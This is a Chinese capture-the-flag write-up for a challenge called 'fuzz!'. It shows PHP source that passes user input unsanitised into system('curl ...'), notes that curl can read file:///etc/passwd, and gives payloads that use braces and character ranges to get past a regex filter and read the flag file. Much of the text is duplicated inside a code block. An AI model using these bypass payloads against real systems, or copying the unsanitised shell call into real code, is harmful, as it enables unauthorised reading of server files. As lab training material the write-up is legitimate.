## fuzz!


***

出题人：Jay17

![image-20240413223118931](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413223118931.png)

直接给了源码：

````php
## fuzz!

***

出题人：Jay17

直接给了源码：

```php
<?php
/*
Read /flaggggggg.txt
Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的
知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd
*/
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);
$file = 'file:///etc/passwd';
if(preg_match("/\`|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\\\\|\'|\"|\;|\<|\>|\,|\?|jay/i", $_GET['file'])){
    die('你需要fuzz一下哦~');
}
if(!preg_match("/fi|le|flag/i", $_GET['file'])){
    $file = $_GET['file'];
}
system('curl '.$file);

```

curl命令参数用花括号绕过过滤。具体参考asisctf。题目会引导选手进行fuzz，会fuzz就会找出没过滤的花括号，加上一点意识和尝试就能解除本题。

首先拿burp进行单个字符的fuzz。以便于更快速找到未被过滤的字符。（fuzz只出现两次就是没被过滤）

![descript](media/c21a4c0aabebb2deef50b75c782d9720.png)

关键是没过滤\`{}\`、\`[]\`、\`-\`。由此我们可以得到以下两个paylaod：

```
?file=f{i}l{e}:///fl{a}ggggggg.txt

或者正则匹配绕过

?file=f[i-i]l[e-e]:///fl[a-a]ggggggg.txt

```

![descript](media/9e03bcad3a3f855ceda202db0fa0d2e2.png)

![descript](media/a16d40e385da15254adf7d1d00bdbf6b.png)


````

curl命令参数用花括号绕过过滤。具体参考asisctf。题目会引导选手进行fuzz，会fuzz就会找出没过滤的花括号，加上一点意识和尝试就能解除本题。

首先拿burp进行单个字符的fuzz。以便于更快速找到未被过滤的字符。（fuzz只出现两次就是没被过滤）

![descript](media/c21a4c0aabebb2deef50b75c782d9720.png)

关键是没过滤\`{}\`、\`[]\`、\`-\`。由此我们可以得到以下两个paylaod：

```
?file=f{i}l{e}:///fl{a}ggggggg.txt

或者正则匹配绕过

?file=f[i-i]l[e-e]:///fl[a-a]ggggggg.txt

```

![descript](media/9e03bcad3a3f855ceda202db0fa0d2e2.png)

![descript](media/a16d40e385da15254adf7d1d00bdbf6b.png)



